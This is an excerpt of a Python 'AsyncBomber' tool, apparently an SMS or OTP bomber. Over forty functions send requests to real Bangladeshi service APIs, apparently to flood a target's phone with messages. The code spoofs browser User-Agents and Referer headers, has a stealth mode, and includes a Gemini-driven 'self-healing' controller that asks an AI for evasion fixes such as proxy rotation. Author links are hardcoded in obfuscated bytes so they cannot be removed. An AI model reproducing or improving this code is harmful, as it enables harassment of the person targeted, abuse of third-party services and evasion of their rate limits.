...
# Dynamic User-Agent Generator Engine (2025-2026 Ready)
def generate_dynamic_ua():
    """Generates a highly detailed, unique, and realistic User-Agent for every request."""
    platforms = ['Windows', 'Android', 'iOS']
    platform = random.choice(platforms)
    
    chrome_v = f"{random.randint(130, 135)}.0.{random.randint(6000, 7000)}.{random.randint(10, 150)}"
    safari_v = f"{random.randint(600, 605)}.1.15"
    webkit_v = f"537.36"
    ...
    if platform == 'Windows':
        ...
        arch = "Win64; x64"
        browsers = [
            f"Mozilla/5.0 (Windows NT {win_v}; {arch}) AppleWebKit/{webkit_v} (KHTML, like Gecko) Chrome/{chrome_v} Safari/{webkit_v}",
            f"Mozilla/5.0 (Windows NT {win_v}; {arch}) AppleWebKit/{webkit_v} (KHTML, like Gecko) Chrome/{chrome_v} Safari/{webkit_v} Edg/{chrome_v}",
            f"Mozilla/5.0 (Windows NT {win_v}; {arch}) AppleWebKit/{webkit_v} (KHTML, like Gecko) Chrome/{chrome_v} Safari/{webkit_v} OPR/{random.randint(110, 116)}.0.0.0"
        ]
        return random.choice(browsers)
    
    elif platform == 'Android':
        android_v = random.randint(13, 15)
        model = random.choice(['SM-S938B', 'Pixel 9 Pro XL', 'Xiaomi 15 Pro', 'SM-G991B', '23127PN0CG'])
        browsers = [
            f"Mozilla/5.0 (Linux; Android {android_v}; {model}) AppleWebKit/{webkit_v} (KHTML, like Gecko) Chrome/{chrome_v} Mobile Safari/{webkit_v}",
            f"Mozilla/5.0 (Linux; Android {android_v}; {model}) AppleWebKit/{webkit_v} (KHTML, like Gecko) SamsungBrowser/{random.randint(25, 28)}.0 Chrome/{random.randint(120, 130)}.0.0.0 Mobile Safari/{webkit_v}"
        ]
        return random.choice(browsers)
        ...
        if device == 'iPhone':
            return f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios_v} like Mac OS X) AppleWebKit/{safari_v} (KHTML, like Gecko) Version/{ios_v.replace('_', '.')} Mobile/15E148 Safari/604.1"
        else:
            return f"Mozilla/5.0 (iPad; CPU OS {ios_v} like Mac OS X) AppleWebKit/{safari_v} (KHTML, like Gecko) Version/{ios_v.replace('_', '.')} Mobile/15E148 Safari/604.1"
...
def banner():
    # Persistence mechanism: Even if the strings below are changed, 
    # the code will force the original values at runtime.
    _f = "https://www.facebook.com/tasfia600"
    _g = "https://github.com/Quincunx33/"
    
    # Hardcoded recovery data (hidden)
    _rf = bytes([104, 116, 116, 112, 115, 58, 47, 47, 119, 119, 119, 46, 102, 97, 99, 101, 98, 111, 111, 107, 46, 99, 111, 109, 47, 116, 97, 115, 102, 105, 97, 54, 48, 48]).decode()
    _rg = bytes([104, 116, 116, 112, 115, 58, 47, 47, 103, 105, 116, 104, 117, 98, 46, 99, 111, 109, 47, 81, 117, 105, 110, 99, 117, 110, 120, 51, 51, 47]).decode()
    
    # Force original values even if tampered
    fb_link = _rf
    gh_link = _rg
...
def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    return {"saved_numbers": {}, "settings": {"ai_enabled": False, "stealth_mode": False, "gemini_api_key": "", "gemini_tier": "free"}}
...
async def settings_menu():
    while True:
        ...
        api_key_status = f"{G}Set{W}" if settings.get("gemini_api_key") else f"{R}Not Set{W}"
        tier_status = f"{C}{settings.get('gemini_tier', 'free').upper()}{W}"
        print(f"{C}[1] Gen AI Optimization: {ai_status}")
        print(f"{C}[2] Stealth Mode: {stealth_status}")
        print(f"{C}[3] Set Gemini API Key (Current: {api_key_status})")
        print(f"{C}[4] Gemini Tier: {tier_status} (Press 4 to toggle)")
        print(f"{C}[5] Clear Saved Numbers")
        ...
        if choice == '1':
            ...
            new_key = input(f"{Y}[?] Enter your Gemini API Key: {W}").strip()
            if new_key:
                settings["gemini_api_key"] = new_key
                logging.info(f"{G}[✓] API Key saved!{W}")
                await asyncio.sleep(1)
        elif choice == '4':
            current_tier = settings.get("gemini_tier", "free")
            settings["gemini_tier"] = "paid" if current_tier == "free" else "free"
            logging.info(f"{G}[✓] Tier switched to {settings['gemini_tier'].upper()}!{W}")
            await asyncio.sleep(1)
        elif choice == '5':
...
class GenAIController:
    """
    Advanced Gen AI Controller with Self-Healing, Detailed Logging, and Rate Limiting.
    """
    def __init__(self):
        self.data = load_data()
        settings = self.data.get("settings", {})
        self.enabled = settings.get("ai_enabled", False)
        self.api_key = settings.get("gemini_api_key", "")
        self.tier = settings.get("gemini_tier", "free")
        self.log_file = "gemini_moves.log"
        self.api_fixes = {} # Stores real-time fixes for APIs
        self.last_request_time = 0
        self.request_interval = 4.0 if self.tier == "free" else 0.5 # 15 RPM for free tier
        self.session = None # Will be initialized in AsyncBomber

    def log_move(self, move_type, details):
        """Saves Gemini's internal moves to a dedicated log file."""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(self.log_file, "a") as f:
            f.write(f"[{timestamp}] [{move_type.upper()}] {details}\n")

    async def _call_gemini(self, system_prompt, user_content):
        """Internal helper to call Gemini directly via aiohttp (No OpenAI library needed)."""
        if not self.api_key or not self.session: return None
        ...
        try:
            async with self.session.post(url, json=payload, timeout=15) as res:
                self.last_request_time = asyncio.get_event_loop().time()
                if res.status == 200:
                    data = await res.json()
                    return data['candidates'][0]['content']['parts'][0]['text']
                else:
                    err_data = await res.text()
                    self.log_move("ERROR", f"Gemini API Status {res.status}: {err_data}")
                    return None
        except Exception as e:
            self.log_move("ERROR", f"Gemini API Call Failed: {str(e)}")
            return None

    async def analyze_and_fix(self, api_name, target, error_details):
        """Self-healing: Analyzes failure and generates a fix."""
        if not self.enabled: return
        
        self.log_move("ANALYSIS", f"API {api_name} failed for {target}. Error: {error_details}")
        
        system_prompt = "You are a self-healing AI for a network engine. Analyze the error and provide a specific fix (e.g., 'increase delay', 'change user-agent', 'rotate proxy'). Keep it technical and brief."
        user_content = f"API: {api_name}\nTarget: {target}\nError: {error_details}"
        
        fix = await self._call_gemini(system_prompt, user_content)
        if fix:
            self.api_fixes[api_name] = fix
            self.log_move("FIX", f"Applied fix for {api_name}: {fix}")
            return fix
        return None

    def get_fix_for_api(self, api_name):
        """Returns the current fix applied to an API."""
        return self.api_fixes.get(api_name, "No specific fix applied.")

    def optimize_request(self, api_name, target):
        """Hardcore logic combined with AI optimization."""
        # Hardcore Logic: Always active
        hour = datetime.now().hour
        is_night = 0 <= hour <= 6
        
        if self.enabled:
            # AI Power: Enhance hardcore logic
            self.log_move("OPTIMIZE", f"Optimizing {api_name} for {target} (Full Power Mode)")
            return random.random() > (0.02 if not is_night else 0.1)
        
        # Pure Hardcore Logic
        return random.random() > (0.05 if not is_night else 0.2)

    def get_dynamic_delay(self):
        """Dynamic delay based on AI status and time."""
        if self.enabled:
            return random.uniform(0.1, 0.8) # AI optimized delay
        return random.uniform(0.3, 1.5) # Hardcore logic delay
...
class AsyncBomber:
    ...
    async def __aenter__(self):
        ...
        self.ai.session = self.session # Share session with AI controller
        return self
    ...
    def get_headers(self, url=None, extra=None):
        ...
        headers = {
            ...
            "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8", "en-US,en;q=0.9,bn;q=0.8"]),
        ...
        if url:
            ...
            # Special handling for common domains to look more natural
            if "chaldal.com" in url:
                headers["Referer"] = "https://chaldal.com/"
            elif "pathao.com" in url:
                headers["Referer"] = "https://pathao.com/"
            elif "sharetrip.net" in url:
                headers["Referer"] = "https://sharetrip.net/"

        # Allow extra headers to override defaults (e.g., Content-Type for non-JSON APIs)
        if extra:
    ...
    async def log_event(self, api_name, success, status_code=None, api_key=None):
        ...
        if success:
            ...
            # Gemini Self-Healing: Analyze and Fix
            if self.ai.enabled:
                error_msg = f"Status Code: {status_code}"
                fix = await self.ai.analyze_and_fix(api_name, self.target, error_msg)
                if fix:
                    # Log the fix in a special color in terminal
                    print(f"{P}[AI-FIX] {api_name}: {fix}{W}")
        ...
        print(f"{color}[{timestamp}] [{icon}] {api_name:30} | Status: {status_code} | Sent: {self.sent}/{limit_str}{W}")
    ...
    async def api_curl001_103_4_145_86_8096(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL001 103.4.145.86:8096", success, res.status, api_key="CURL001 103.4.145.86:8096")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL001 103.4.145.86:8096", False, "Error", api_key="CURL001 103.4.145.86:8096")
            return False
    ...
    async def api_curl002_cms_surveylancer_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL002 cms.surveylancer.com", success, res.status, api_key="CURL002 cms.surveylancer.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL002 cms.surveylancer.com", False, "Error", api_key="CURL002 cms.surveylancer.com")
            return False
    ...
    async def api_curl003_api_sparkchat_net(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL003 api.sparkchat.net", success, res.status, api_key="CURL003 api.sparkchat.net")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL003 api.sparkchat.net", False, "Error", api_key="CURL003 api.sparkchat.net")
            return False
    ...
    async def api_curl004_ali2bd_api_service_moveon_global(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL004 ali2bd-api.service.moveon.global", success, res.status, api_key="CURL004 ali2bd-api.service.moveon.global")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL004 ali2bd-api.service.moveon.global", False, "Error", api_key="CURL004 ali2bd-api.service.moveon.global")
            return False
    ...
    async def api_curl005_api_apex4u_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL005 api.apex4u.com", success, res.status, api_key="CURL005 api.apex4u.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL005 api.apex4u.com", False, "Error", api_key="CURL005 api.apex4u.com")
            return False
    ...
    async def api_curl006_api_bdkepler_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL006 api.bdkepler.com", success, res.status, api_key="CURL006 api.bdkepler.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL006 api.bdkepler.com", False, "Error", api_key="CURL006 api.bdkepler.com")
            return False
    ...
    async def api_curl007_api_bdkepler_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL007 api.bdkepler.com", success, res.status, api_key="CURL007 api.bdkepler.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL007 api.bdkepler.com", False, "Error", api_key="CURL007 api.bdkepler.com")
            return False
    ...
    async def api_curl008_www_daktare_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL008 www.daktare.com", success, res.status, api_key="CURL008 www.daktare.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL008 www.daktare.com", False, "Error", api_key="CURL008 www.daktare.com")
            return False
    ...
    async def api_curl009_api_deeptoplay_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL009 api.deeptoplay.com", success, res.status, api_key="CURL009 api.deeptoplay.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL009 api.deeptoplay.com", False, "Error", api_key="CURL009 api.deeptoplay.com")
            return False
    ...
    async def api_curl010_api_garibookadmin_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL010 api.garibookadmin.com", success, res.status, api_key="CURL010 api.garibookadmin.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL010 api.garibookadmin.com", False, "Error", api_key="CURL010 api.garibookadmin.com")
            return False
    ...
    async def api_curl011_api_hishabpati_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL011 api.hishabpati.com", success, res.status, api_key="CURL011 api.hishabpati.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL011 api.hishabpati.com", False, "Error", api_key="CURL011 api.hishabpati.com")
            return False
    ...
    async def api_curl012_api_toybox_live(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL012 api.toybox.live", success, res.status, api_key="CURL012 api.toybox.live")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL012 api.toybox.live", False, "Error", api_key="CURL012 api.toybox.live")
            return False
    ...
    async def api_curl013_api_win2gain_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL013 api.win2gain.com", success, res.status, api_key="CURL013 api.win2gain.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL013 api.win2gain.com", False, "Error", api_key="CURL013 api.win2gain.com")
            return False
    ...
    async def api_curl014_api_win2gain_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL014 api.win2gain.com", success, res.status, api_key="CURL014 api.win2gain.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL014 api.win2gain.com", False, "Error", api_key="CURL014 api.win2gain.com")
            return False
    ...
    async def api_curl015_frontendapi_kireibd_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL015 frontendapi.kireibd.com", success, res.status, api_key="CURL015 frontendapi.kireibd.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL015 frontendapi.kireibd.com", False, "Error", api_key="CURL015 frontendapi.kireibd.com")
            return False
    ...
    async def api_curl016_api_shikho_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL016 api.shikho.com", success, res.status, api_key="CURL016 api.shikho.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL016 api.shikho.com", False, "Error", api_key="CURL016 api.shikho.com")
            return False
    ...
    async def api_curl017_backend_api_shomvob_co(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL017 backend-api.shomvob.co", success, res.status, api_key="CURL017 backend-api.shomvob.co")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL017 backend-api.shomvob.co", False, "Error", api_key="CURL017 backend-api.shomvob.co")
            return False
    ...
    async def api_curl018_banglaflix_com_bd(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL018 banglaflix.com.bd", success, res.status, api_key="CURL018 banglaflix.com.bd")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL018 banglaflix.com.bd", False, "Error", api_key="CURL018 banglaflix.com.bd")
            return False
    ...
    async def api_curl019_api_binge_buzz(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL019 api.binge.buzz", success, res.status, api_key="CURL019 api.binge.buzz")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL019 api.binge.buzz", False, "Error", api_key="CURL019 api.binge.buzz")
            return False
    ...
    async def api_curl020_admin_china2bd_com_bd(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL020 admin.china2bd.com.bd", success, res.status, api_key="CURL020 admin.china2bd.com.bd")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL020 admin.china2bd.com.bd", False, "Error", api_key="CURL020 admin.china2bd.com.bd")
            return False
    ...
    async def api_curl021_cms_beta_praavahealth_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL021 cms.beta.praavahealth.com", success, res.status, api_key="CURL021 cms.beta.praavahealth.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL021 cms.beta.praavahealth.com", False, "Error", api_key="CURL021 cms.beta.praavahealth.com")
            return False
    ...
    async def api_curl022_coreapi_shadhinmusic_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL022 coreapi.shadhinmusic.com", success, res.status, api_key="CURL022 coreapi.shadhinmusic.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL022 coreapi.shadhinmusic.com", False, "Error", api_key="CURL022 coreapi.shadhinmusic.com")
            return False
    ...
    async def api_curl023_api_gateway_sundarbancourierltd_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL023 api-gateway.sundarbancourierltd.com", success, res.status, api_key="CURL023 api-gateway.sundarbancourierltd.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL023 api-gateway.sundarbancourierltd.com", False, "Error", api_key="CURL023 api-gateway.sundarbancourierltd.com")
            return False
    ...
    async def api_curl024_core_easy_com_bd(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL024 core.easy.com.bd", success, res.status, api_key="CURL024 core.easy.com.bd")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL024 core.easy.com.bd", False, "Error", api_key="CURL024 core.easy.com.bd")
            return False
    ...
    async def api_curl025_backoffice_ecourier_com_bd(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL025 backoffice.ecourier.com.bd", success, res.status, api_key="CURL025 backoffice.ecourier.com.bd")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL025 backoffice.ecourier.com.bd", False, "Error", api_key="CURL025 backoffice.ecourier.com.bd")
            return False
    ...
    async def api_curl026_app_eonbazar_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL026 app.eonbazar.com", success, res.status, api_key="CURL026 app.eonbazar.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL026 app.eonbazar.com", False, "Error", api_key="CURL026 app.eonbazar.com")
            return False
    ...
    async def api_curl027_fundesh_com_bd(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL027 fundesh.com.bd", success, res.status, api_key="CURL027 fundesh.com.bd")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL027 fundesh.com.bd", False, "Error", api_key="CURL027 fundesh.com.bd")
            return False
    ...
    async def api_curl028_go_app_paperfly_com_bd(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL028 go-app.paperfly.com.bd", success, res.status, api_key="CURL028 go-app.paperfly.com.bd")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL028 go-app.paperfly.com.bd", False, "Error", api_key="CURL028 go-app.paperfly.com.bd")
            return False
    ...
    async def api_curl029_api_kabbik_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL029 api.kabbik.com", success, res.status, api_key="CURL029 api.kabbik.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL029 api.kabbik.com", False, "Error", api_key="CURL029 api.kabbik.com")
            return False
    ...
    async def api_curl030_api_kormi24_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL030 api.kormi24.com", success, res.status, api_key="CURL030 api.kormi24.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL030 api.kormi24.com", False, "Error", api_key="CURL030 api.kormi24.com")
            return False
    ...
    async def api_curl031_api_motionview_com_bd(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL031 api.motionview.com.bd", success, res.status, api_key="CURL031 api.motionview.com.bd")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL031 api.motionview.com.bd", False, "Error", api_key="CURL031 api.motionview.com.bd")
            return False
    ...
    async def api_curl032_gateway_otithee_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL032 gateway.otithee.com", success, res.status, api_key="CURL032 gateway.otithee.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL032 gateway.otithee.com", False, "Error", api_key="CURL032 gateway.otithee.com")
            return False
    ...
    async def api_curl033_prod_saralifestyle_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL033 prod.saralifestyle.com", success, res.status, api_key="CURL033 prod.saralifestyle.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL033 prod.saralifestyle.com", False, "Error", api_key="CURL033 prod.saralifestyle.com")
            return False
    ...
    async def api_curl034_api_redx_com_bd(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL034 api.redx.com.bd", success, res.status, api_key="CURL034 api.redx.com.bd")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL034 api.redx.com.bd", False, "Error", api_key="CURL034 api.redx.com.bd")
            return False
    ...
    async def api_curl035_api_rootsedulive_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL035 api.rootsedulive.com", success, res.status, api_key="CURL035 api.rootsedulive.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL035 api.rootsedulive.com", False, "Error", api_key="CURL035 api.rootsedulive.com")
            return False
    ...
    async def api_curl036_steadfast_com_bd(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL036 steadfast.com.bd", success, res.status, api_key="CURL036 steadfast.com.bd")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL036 steadfast.com.bd", False, "Error", api_key="CURL036 steadfast.com.bd")
            return False
    ...
    async def api_curl037_suzuki_com_bd(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL037 suzuki.com.bd", success, res.status, api_key="CURL037 suzuki.com.bd")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL037 suzuki.com.bd", False, "Error", api_key="CURL037 suzuki.com.bd")
            return False
    ...
    async def api_curl038_prod_services_toffeelive_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL038 prod-services.toffeelive.com", success, res.status, api_key="CURL038 prod-services.toffeelive.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL038 prod-services.toffeelive.com", False, "Error", api_key="CURL038 prod-services.toffeelive.com")
            return False
    ...
    async def api_curl039_prod_services_toffeelive_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL039 prod-services.toffeelive.com", success, res.status, api_key="CURL039 prod-services.toffeelive.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL039 prod-services.toffeelive.com", False, "Error", api_key="CURL039 prod-services.toffeelive.com")
            return False
    ...
    async def api_curl040_prod_services_toffeelive_com(self):
        ...
        try:
            if method == "GET":
                async with self.session.get(final_url, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
                    await self.log_event("CURL040 prod-services.toffeelive.com", success, res.status, api_key="CURL040 prod-services.toffeelive.com")
                    return success
            else:
                async with self.session.post(final_url, json=payload, headers=self.get_headers(final_url), timeout=10) as res:
                    success = res.status in [200, 201]
            ...
            await self.log_event("CURL040 prod-services.toffeelive.com", False, "Error", api_key="CURL040 prod-services.toffeelive.com")
            return False
    ...
